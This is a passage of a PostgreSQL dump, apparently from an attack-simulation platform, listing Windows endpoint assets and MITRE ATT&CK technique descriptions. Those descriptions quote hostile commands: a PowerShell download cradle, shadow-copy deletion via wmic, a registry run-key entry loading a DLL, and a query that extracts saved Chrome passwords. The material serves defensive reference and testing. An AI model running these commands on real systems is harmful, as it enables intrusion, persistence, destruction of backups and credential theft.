4ad149ae-1070-499a-84bc-fa55a3b9c8e2	Endpoint	DESKTOP-3TJ3MVE	\N	2026-01-09 14:20:23.366754+00	2026-01-16 10:17:08.37643+00	{fe80::2bde:c43c:abfb:2051,10.0.0.46}	desktop-3tj3mve	Windows	{bc24116fd378}	01ce79b580406fc12ba48a8fb1093313682e67851e4ccdd075959d14d23db157	x86_64	\N	\N	\N	10.0.0.46	f
ae65e95f-1db6-4423-a763-1759132f960c	Endpoint	WIN-MQO4CP3093B	\N	2026-01-09 14:20:15.848467+00	2026-01-16 10:17:50.79326+00	{fe80::71d2:70e:b0a9:c611,10.0.0.44}	win-mqo4cp3093b	Windows	{bc2411e8f795}	df43caaac284884f708880d3118212fc744442b58389a5dfb7bcc086dd15acf8	x86_64	\N	\N	\N	10.0.0.44	f
\.


--
-- Data for Name: assets_tags; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.assets_tags (asset_id, tag_id) FROM stdin;
0357db48-9af3-4664-b239-9d1bb0ed5aa9	89530ea3-86d2-49fc-a4ea-0cff60cb7136
0357db48-9af3-4664-b239-9d1bb0ed5aa9	6578027e-c24c-4762-a6fb-7acfcaa33113
4ad149ae-1070-499a-84bc-fa55a3b9c8e2	601897e7-549f-4c3b-bc45-3c5b2e913aaa
ae65e95f-1db6-4423-a763-1759132f960c	601897e7-549f-4c3b-bc45-3c5b2e913aaa
\.


--
-- Data for Name: attack_patterns; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.attack_patterns (attack_pattern_id, attack_pattern_created_at, attack_pattern_updated_at, attack_pattern_name, attack_pattern_description, attack_pattern_external_id, attack_pattern_platforms, attack_pattern_permissions_required, attack_pattern_parent, attack_pattern_stix_id) FROM stdin;
cf178ab6-ddc5-4140-a47e-dab9d72607a8	2026-01-09 14:19:24.773116+00	2026-01-09 14:19:24.773136+00	System Binary Proxy Execution	Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.\n\nSimilarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)	T1218	{}	{}	\N	attack-pattern--25e3d85a-968b-4294-83f4-84f77c1332c5
1af1d8b9-d207-43de-acdf-97f770b42388	2026-01-09 14:19:24.804967+00	2026-01-09 14:19:24.804986+00	PowerShell	Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)	T1059.001	{}	{}	\N	attack-pattern--1b856a46-4bbb-48fb-8d64-e1607c0fd33f
5a9373ec-b51b-4aa7-b2c7-d6035fa2acde	2026-01-09 14:19:24.825736+00	2026-01-09 14:19:24.825755+00	Ingress Tool Transfer	Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)  A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023)\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms)\n\nFiles can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)	T1105	{}	{}	\N	attack-pattern--4b4921ef-11ab-4051-85e2-c2346539a5ce
a42a60f3-15eb-41de-9308-64b9977174b0	2026-01-09 14:19:24.860837+00	2026-01-09 14:19:24.860862+00	Masquerade File Type	Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file’s signature, extension, icon, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file’s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file’s type. For example, the header of a JPEG file,  is <code> 0xFF 0xD8</code> and the file extension is either `.JPE`, `.JPEG` or `.JPG`. \n\nAdversaries may edit the header’s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and stored (e.g., [Upload Malware](https://attack.mitre.org/techniques/T1608/001)) so that adversaries may move their malware without triggering detections. \n\nCommon non-executable file types and extensions, such as text files (`.txt`) and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of <code>test.gif</code>. A user may not know that a file is malicious due to the benign appearance and file extension.\n\nPolygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.(Citation: polygot_icedID)	T1036.008	{}	{}	\N	attack-pattern--e823c102-293d-4a5a-b67a-a20b9476421b
93f4b270-e7b6-4c21-abfb-bfc79cfe4477	2026-01-09 14:19:25.231048+00	2026-01-09 14:19:25.231068+00	File and Directory Discovery	Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)\n\nSome files and directories may require elevated or specific user permissions to access.	T1083	{}	{}	\N	attack-pattern--5e64aea4-9486-4126-af11-bebbd3984e36
42fcd04d-91af-4398-83fc-49bc10058bf7	2026-01-09 14:19:25.27009+00	2026-01-09 14:19:25.270108+00	Archive via Utility	Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)	T1560.001	{}	{}	\N	attack-pattern--e0d11567-4025-4917-b112-0a727a35d808
be317029-11ff-4692-9d17-53d7880134ab	2026-01-09 14:19:25.537944+00	2026-01-09 14:19:25.537963+00	SMB/Windows Admin Shares	Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)	T1021.002	{}	{}	\N	attack-pattern--d1c81a72-496b-4342-be86-3a3634f6357d
5530bf7d-e940-4266-9936-05454b05b21c	2026-01-09 14:19:25.563947+00	2026-01-09 14:19:25.563969+00	Remote System Discovery	Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097), <code>net view</code> using [Net](https://attack.mitre.org/software/S0039), or, on ESXi servers, `esxcli network diag ping`.\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)  \n	T1018	{}	{}	\N	attack-pattern--cdc6b96e-7a0f-41a6-873f-c4d5c7137bae
546cb203-439a-4a43-bd1f-5143694e3245	2026-01-09 14:19:25.822564+00	2026-01-09 14:19:25.822584+00	Malicious File	An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and .reg.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).	T1204.002	{}	{}	\N	attack-pattern--38add434-76d1-43a4-b3c5-a5eba8db2ee2
c30b5c64-6636-4266-b627-915190a56423	2026-01-09 14:19:25.837032+00	2026-01-09 14:19:25.837052+00	Software Packing	Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.(Citation: Awesome Executable Packing)  	T1027.002	{}	{}	\N	attack-pattern--26c8034f-a958-467c-842d-c5b1052fdfb5
24053ce0-1450-49f5-bb4c-56f2413fbf78	2026-01-09 14:19:27.088034+00	2026-01-09 14:19:27.088056+00	Exfiltration to Cloud Storage	Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. 	T1567.002	{}	{}	\N	attack-pattern--a3d751f5-fee5-4f7b-8cbc-bc870baa5e99
dd1b8801-a3c7-4b6e-8f05-c6848bcd5521	2026-01-09 14:19:26.068945+00	2026-01-09 14:19:26.068967+00	Command and Scripting Interpreter	Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nThere are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)	T1059	{}	{}	\N	attack-pattern--9370cec6-f884-4738-8cd8-cd7ea46588ce
1bdc2a2a-ea12-4fad-acc0-0fc6cce7272a	2026-01-09 14:19:26.281512+00	2026-01-09 14:19:26.281536+00	Domain Account	Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups.(Citation: CrowdStrike StellarParticle January 2022)  	T1087.002	{}	{}	\N	attack-pattern--8ee5534b-d52b-41e4-b784-17664dcc84db
6478e325-2b60-41ff-8330-09c5116d4caf	2026-01-09 14:19:26.297873+00	2026-01-09 14:19:26.297891+00	Local Account	Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code> on macOS and Linux can list local users and groups.(Citation: Mandiant APT1)(Citation: id man page)(Citation: groups man page) On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS, the <code>dscl . list /Users</code> command can be used to enumerate local accounts. On ESXi servers, the `esxcli system account list` command can list local user accounts.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)	T1087.001	{}	{}	\N	attack-pattern--8bad22f9-422e-4c4b-834e-36e797a0f66a
5e4e119f-a147-4bc7-a017-d30324f70c48	2026-01-09 14:19:26.457033+00	2026-01-09 14:19:26.457051+00	Windows Management Instrumentation	Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.(Citation: WMI 1-3) WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation: WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI 1-3) (Citation: Mandiant WMI)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007) as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation: WMI 6)\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being “disabled by default” on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001) as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)	T1047	{}	{}	\N	attack-pattern--4c5b98e3-6124-4526-b008-bce6ffcdb886
c6d79b29-531b-4f56-903c-a552ac852b9a	2026-01-09 14:19:26.464912+00	2026-01-09 14:19:26.464931+00	Automated Collection	Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. \n\nIn cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data.(Citation: Mandiant UNC3944 SMS Phishing 2023) \n\nThis functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) to identify resources in cloud environments.	T1119	{}	{}	\N	attack-pattern--c320d7cc-f5db-4040-ab72-a91c1f90215d
217b7238-f0c4-4dc8-94af-883f9c41ee58	2026-01-09 14:19:26.475992+00	2026-01-09 14:19:26.476009+00	Windows Command Shell	Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.	T1059.003	{}	{}	\N	attack-pattern--443a04ab-5243-420a-8b3e-35d6d74e1f91
10b4df1e-61a5-4728-96b4-29f0feecb285	2026-01-09 14:19:26.638894+00	2026-01-09 14:19:26.638913+00	Registry Run Keys / Startup Folder	Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a "Depend" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.	T1547.001	{}	{}	\N	attack-pattern--5915b636-aada-4e3a-891f-c6dca81d3214
bab4a4fd-0ca9-4f7f-911d-09b5fec78350	2026-01-09 14:19:26.753654+00	2026-01-09 14:19:26.753675+00	Windows Service	Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as "Bring Your Own Vulnerable Driver" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create ‘hidden’ services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)	T1543.003	{}	{}	\N	attack-pattern--1bc29a70-9023-4e3d-a130-170f4acbc8f1
bcdfaef2-a29f-4c14-8024-b6390ac2e02f	2026-01-09 14:19:26.889434+00	2026-01-09 14:19:26.889455+00	Credentials from Web Browsers	Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData April 2018)\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).	T1555.003	{}	{}	\N	attack-pattern--78d9dd09-0289-4530-846f-829ac6598cf2
29c8e3cb-e63e-4f8b-abe4-13fd13acac46	2026-01-09 14:19:26.903452+00	2026-01-09 14:19:26.903473+00	Data from Local System	Adversaries may search local system sources, such as file systems, configuration files, local databases, or virtual machine files, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n	T1005	{}	{}	\N	attack-pattern--ac8f1c77-036c-45c5-b5e7-1250c3a52df3
